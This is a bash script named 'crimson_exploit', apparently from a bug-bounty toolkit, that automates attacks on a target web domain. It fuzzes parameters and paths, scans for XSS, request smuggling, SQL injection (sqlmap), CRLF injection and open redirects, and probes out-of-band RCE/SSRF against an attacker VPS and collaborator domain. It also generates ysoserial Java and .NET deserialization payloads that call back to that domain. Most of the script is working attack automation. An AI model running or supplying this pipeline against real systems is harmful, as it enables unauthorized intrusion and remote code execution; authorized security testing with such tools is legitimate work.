#!/bin/bash
#
### CREATED BY KARMAZ
#
#
# TO DO:
# 1. BUILD HEADERATOR
# 1. BUILD METHODMAN
# 1. TEST .net DESERIALIZATION 
# 1. ADD CSRF SCANNER - https://github.com/s0md3v/Bolt
# 1. MAKE BETTER CRLF PYTHON SCRIPT 
# 1. Implement dalfox
# 1. Implement xsstron
####  FUNCTIONS:
#
# 1. FUZZ PATHS IN URLS FROM dirs.txt WITH CUSTOM PAYLOADS
# 2. FUZZ PARAMS IN URLS FROM params.txt WITH CUSTOM PAYLOADS
# 3. TEST FOR XSS
# 4. CHECK FOR "X-Original-Url" OR "X-Rewrite-Url" HEADER
# 5. TEST HTTP REQUEST SMUGGLING
# 6. TEST HOP-BY-HOP DELETION
# 7. TEST FOR BROKEN LINKS
# 8. TEST SQLI
# 9. TEST OUT-OF-BOUND RCE/SSRF
# 10. TEST JAVA DESERIALIZATION
# 11. TEST CRLF INJECTION
# 12. TEST FOR OPEN REDIRECTION
#
### LISTS:
#
# 1. bug_params.txt
# 2. bug_dirs.txt
# 3. vuln_xss
# 4. rewriter.txt
# 5. smuggler.txt
# 6. hop_by_hop.txt
# 7. broken_links.txt
# 8. sqli/
# 9. oob.txt
# 10. CRLF.txt
# 11. OR.txt
# 12. dalfox.txt
### WORKFLOW
# 0. Start BURP
# 1. Start vps listener and collaborator
# 2. Start the script
# 3. Check the output listed above (LISTS)
# 4. Check size and response code of bug_params.txt and bug_urls.txt
# 5. Look for [ID] [TIME] in oob.txt and compare it to pings on your vps / collaborator
# 6. Check sqli/ directory
# 7. Check redirection in OR.txt
# 8. Check deserialization pings with manual payloads generated by this script
# 2
###

echo -e "\033[0;31m
 ██████╗██████╗ ██╗███╗   ███╗███████╗ ██████╗ ███╗   ██╗        ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║████╗ ████║██╔════╝██╔═══██╗████╗  ██║        ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║     ██████╔╝██║██╔████╔██║███████╗██║   ██║██╔██╗ ██║        █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
██║     ██╔══██╗██║██║╚██╔╝██║╚════██║██║   ██║██║╚██╗██║        ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
╚██████╗██║  ██║██║██║ ╚═╝ ██║███████║╚██████╔╝██║ ╚████║███████╗███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
 ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
\033[0m"

while getopts "c:d:i:D" OPTION; do
    case $OPTION in
    c)
        cookie=$OPTARG
        ;;
    d)
        collaborator_domain=$OPTARG
        ;;
    i)
	vps_ip=$OPTARG
	;;
    D)
        domain=$OPTARG
	export DOMAIN=`tldextract $domain | cut -d " " -f 2-3 | sed "s/\ /\./"
	;;	
    *)
        echo "Incorrect options provided"
        exit 1
        ;;
    esac
done

### CHECK IF USER SET A COOKIE IF NOTE SET IT TO _ga
if [ -z $cookie ]
then
        cookie="Cookie: _ga=23489yfdshbfji324987sfdnik4327fdnskdfh834";
else
        cookie=$cookie;
fi

if [ -z $collaborator_domain ] || [ -z $vps_ip ] || [ -z $domain ] || [ -z $DOMAIN ]
then
	echo "Export domain and DOMAIN first!"
	echo "	Usage: ./crimson_exploit -D [domain_to_export] -i [listener_vps_ip] -d [collaborator_domain]"
	exit 1
else

### CHANGE DIRECTORY TO YOUR TARGET AND PRINT params.txt AND dirs.txt FOR MANUAL REVIEW
cd $HOME/bounty/$DOMAIN/$domain/exp
scite params.txt dirs.txt

if [ -s "params.txt" ]
then
echo -e "\033[0;31m [+]\033[0mPARAMETER FUZZING"

### FUZZ ALL URLS IN params.txt WITH bug WORDLIST = bug_params.txt
python $HOME/tools/CRIMSON/scripts/crimson_paramjuggler.py -l params.txt -p "FUZZ" >> temp_params.txt
custom_i=0; for line in $(cat temp_params.txt); do custom_i=$((custom_i+1)) && wfuzz -f temp_bug$custom_i.txt,raw -Z -z file,$HOME/tools/CRIMSON/words/bug -H $cookie $line | tail -n+11; done
sort -u  temp_bug* | grep "http" | grep -v "Pycurl" | grep -v "^Target" > bug_params.txt
rm temp_bug*
else
        echo " [-] params.txt IS EMPTY"
fi

if [ -s "dirs.txt" ]
then
echo -e "\033[0;31m [+]\033[0mURL FUZZING"
### FUZZ ALL URLS IN dirs.txt WITH bug WORDLIST = bug_dirs.txt
wfuzz -f bug_dirs.txt,raw -L -Z -z file,dirs.txt -z file,$HOME/tools/CRIMSON/words/bug -H $cookie FUZZFUZ2Z
else
	echo " [-] dirs.txt IS EMPTY"
fi

### MERGE params.txt AND dirs.txt = all.txt
sort -u params.txt dirs.txt ../ffuf.txt >> all.txt

### CHECK FOR XSS VULNERABILITY in all.txt = vuln_xss
python3 /home/karmaz/tools/XSStrike/xsstrike.py --seeds all.txt -t 100 | tee -a xss

### OPEN ALL VULNS IN FIREFOX FOR MANUAL REVIEW
cat xss | grep "Vulnerable webpage" | sed "s/^.*http/http/" | cat -A | sed 's/\^.*$//' > url_XSS
cat xss | grep "Vulnerable webpage" -A 1 | grep Vector | cut -d " " -f 4 | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | sed 's/://' > param_XSS
cat xss | grep "Vulnerable webpage" -A 1 | grep Vector | cut -d " " -f 5 > payload_XSS 
paste url_XSS param_XSS payload_XSS | cat -A | sed 's/\^I/\?/' | sed 's/\^I/=/' | sed -r 's/(.*)\$/\1 /' > vuln_xss && rm url_XSS param_XSS payload_XSS
python $HOME/tools/CRIMSON/scripts/crimson_opener -o vuln_xss

### TEST XSS USING DAFLOX
cat all.txt | dalfox pipe --mass --silence --no-color -o dalfox.txt

### TEST URL REWRITE = rewriter.txt
$HOME/tools/CRIMSON/scripts/crimson_rewriter.py | tee -a rewriter.txt

### TEST HTTP REQUEST SMUGGLING = smuggler.txt
cat all.txt | python3 $HOME/tools/smuggler/smuggler.py -l smuggler.txt -q | tee -a log_smuggler.txt
# Automat cat asd | grep payload | cut -d":" -f3 | cut -d" " -f2  - do proxy / openera

### TEST HOP-BY-HOP DELETION (only on main domain) = hop_by_hop.txt
cd $HOME/tools/hop-by-hop/
./poison_test.sh "https://$domain" | tee -a ~/bounty/$DOMAIN/$domain/exp/hop_by_hop.txt
cd $HOME/bounty/$DOMAIN/$domain/exp

### TEST BROKEN  LINKS = broken_links.txt
for url in $(cat all.txt); do blc $url -ro >> broken_links.txt ;done

### TEST SQLi = sqli/
sqlmap -m params.txt -b --batch -o -v 0 -H $cookie - --output-dir=sqli

### TEST OOB = oob.txt
$HOME/tools/CRIMSON/scripts/crimson_oobtester.py -i $vps_ip -d $collaborator_domain -p "$HOME/tools/CRIMSON/words/exp/OOB" -l "params.txt" | tee -a oob.txt

### TEST JAVA DESERIALIZATION
python $HOME/tools/CRIMSON/scripts/crimson_deserializator.py -d $collaborator_domain -l params.txt -H $cookie

### TEST CRLF = CRLF.txt
crlfuzz -l all.txt -s | tee -a CRLF.txt

### TEST OR = OR.txt
cat dirs.txt | sed "s/$/FUZZ/"  >> temp_or_test.txt
cat temp_params.txt >> temp_or_test.txt
custom_i=0; for line in $(cat temp_or_test.txt); do custom_i=$((custom_i+1)) && wfuzz -f temp_OR$custom_i.txt,raw -Z -z file,$HOME/tools/CRIMSON/words/exp/OR --filter "c=301 or c=302 or c=308" -H $cookie $line | tail -n+11 ;done
sort -u  temp_OR* | grep "http" | grep -v "Pycurl" | grep -v "^Target" >> OR.txt
rm temp_OR*

### GENERATE ALL JAVA PAYLOADS FOR MANUAL DESERIALIZATION
for gadget in $(cat $HOME/tools/CRIMSON/words/exp/jargadgetss); do java -jar $HOME/tools/ysoserial/ysoserial.jar $gadget "$collaborator_domain" | base64 -w0 >> temp_payloads.txt && echo >> temp_payloads.txt ;done ; sed '/^$/d' temp_payloads.txt > java_deserialization_payloads.txt; rm temp_payloads.txt

### GENERATE ALL PAYLOADS FOR .NET DESERIALIZATION FOR MANUAL TESTING
for gadget in $(cat $HOME/tools/CRIMSON/words/exp/netgadgets); do wine $HOME/tools/netysoserial/ysoserial.exe -f BinaryFormatter -g $gadget -o base64 -c "$collaborator_domain" >> net_deserialization_payloads.txt ;done

### CHECK FILES
scite vuln_xss rewriter.txt smuggler.txt CRLF.txt OR.txt broken_links.txt hop_by_hop.txt

### CHECK API KEYS
echo "HOW TO CHECK: https://github.com/streaak/keyhacks"
echo "FOR GIT REPO: https://github.com/dxa4481/truffleHog/"
echo "FOR ALL SOURCE CODE: https://github.com/m4ll0k/SecretFinder"
echo ""

### CHECK AWS
echo "https://github.com/m4ll0k/SecretFinder"

### REMOVE TRASH
rm temp_params.txt temp_dirs.txt
fi

